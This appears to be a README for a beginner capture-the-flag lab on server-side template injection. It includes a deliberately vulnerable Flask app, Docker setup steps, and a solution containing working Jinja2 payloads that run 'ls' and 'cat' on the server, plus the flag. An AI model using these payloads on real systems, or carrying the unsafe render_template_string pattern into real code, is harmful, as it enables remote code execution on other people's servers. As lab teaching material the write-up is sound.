# SSTI-Intro

### Difficulty: Beginner

## Setting Up

Ensures that `Docker` is installed into your machine as this challenge requires Docker. If you're unsure how to do it, you can refer [here](https://www.kali.org/docs/containers/installing-docker-on-kali/) to install it into your Kali machine. Then, install the files `app.py` , `Dockerfile` and `flag-6fbbff92650117ea3994ead7b72dbda7.txt` into the same directory.

### Commands (Kali)
[1] `sudo docker build -t sstichall .`

[2] `sudo docker run -d sstichall`

[3] `sudo docker logs <The container id>`

Use the first IP provided by the command [3] to access the challenge as highlighted below.

![image](https://github.com/user-attachments/assets/a2dc8099-2cb9-42d9-a8d2-c34d04b245e8)

Challenge should look like this and you are ready to go!

![image](https://github.com/user-attachments/assets/71d4d057-c35f-4c21-b28f-efaa2f35bff9)

## Solution 
<details>


The challenge starts with a text box and allows user input. Then, we starts with the a simple text "hello world" and observe its response.

![image](https://github.com/user-attachments/assets/8c6da092-9fc2-4a3b-9054-d900ca44c47d)

The website seems to return our text back as a response. 

![image](https://github.com/user-attachments/assets/03732c9a-86e7-4042-9ea6-9877e978db85)

Let's analyze the source code and observe what kind of vulnerability does the server contains.

### Source Code (python)
```python

from flask import Flask, request, url_for, render_template_string

app=Flask(__name__)

@app.route('/', methods=('GET','POST'))
def index():
	if request.method=='POST':
		note=request.form['note']
		if note:
			return render_template_string(note)
		else:
			return('Please provide some text')
	return '''
		<form method="POST">
			Note:<input type="text" name="note">
			<input type="submit" value="Submit">
		</form>
	'''

if __name__=='__main__':
	app.run(host='0.0.0.0',port= 80,debug=True) 

```

We can see that the source code contains `render_template_string()` which is a Jinja2 web template engine function for Python that has a SSTI vulnerability. 
Let's try using a simple SSTI payload `{{7*7}}` and observe its behaviour.

![image](https://github.com/user-attachments/assets/d853ed2f-3c60-48bd-880a-be6fa23756ca)

The website returns `49`! That means it is confirmed that the website is vulnerable to SSTI.

![image](https://github.com/user-attachments/assets/26b6ae54-1bfe-4884-9df2-66fe944dbcea)

Let's use a SSTI payload like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` and read the files in the server.

![image](https://github.com/user-attachments/assets/16b5e54c-64fe-4fc6-a4eb-b1bf843e9af2)

Now we know that there is a file called `flag-6fbbff92650117ea3994ead7b72dbda7.txt` so we can use this payload to read the content of the file `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag-6fbbff92650117ea3994ead7b72dbda7.txt').read()}}`. Then, we should be able to retrieved the flag.

![image](https://github.com/user-attachments/assets/676d9337-6f06-4d9d-b429-601bf1f311cf)

## Flag
>flag{9e21e40be1f2003d55c96d6407e28b01}

</details>
